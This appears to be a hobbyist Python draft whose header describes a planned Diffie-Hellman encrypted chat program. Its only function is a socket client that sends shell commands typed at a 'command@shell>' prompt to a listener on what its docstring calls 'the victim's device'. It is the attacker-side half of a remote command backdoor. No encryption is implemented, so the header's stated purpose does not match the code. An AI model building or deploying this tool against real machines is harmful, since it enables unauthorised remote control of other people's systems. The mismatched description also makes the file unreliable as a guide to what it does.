#!/usr/bin/python3

# William

# This program allows to create connections between two hosts and send encrypted data using the Diffie Hellman pki

# TO DO:
#   - make the connection using sockets and automatically implement the Diffie Hellman pki
#   - use threads to be able to open connections on multiple ports
#   - allows the clients to send encrypted data back and forth
#   - allow for encrypted file tranfers ?

# Final architecture will probably have 3 classes
#   - one for the crypto clients (identified by their private and public keys) each instance should represent one "person" wanting to talk to an other
#   - one for each end to end connection (person to person), it should handle the sending, recieving and be the link between the users and the following class
#   - one for the basic connection infrastructure (assigning ports, managing the number of connections, the roles etc...) it will probably have a stack of users and of sockets


# https://docs.python.org/3.7/howto/sockets.html
# https://docs.python.org/3.7/library/threading.html

import socket

# for now this program is a first draft


def send_command(host="william-VirtualBox", port=10000):
    '''
    This function will create a socket, connect to the address and port provided by the attacker and prompt the user for commands to send to the listener. Make sure the listener is running on the victim's device.
    '''
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((socket.gethostname(), 10001)) # by default the commands will be sent through port 10001
    s.connect((host, port)) # connect to the victim's machine
    command=""
    while not command=="exit":
        command=input("command@shell> ")
        s.send(command.encode()) # send the command typed by the attacker
    s.shutdown(socket.SHUT_RDWR)
    s.close()
    

if __name__=="__main__":
    host=input("Hostname:   ")
    port=int(input("Port:   "))
    send_command(host, port)
#        send_command()
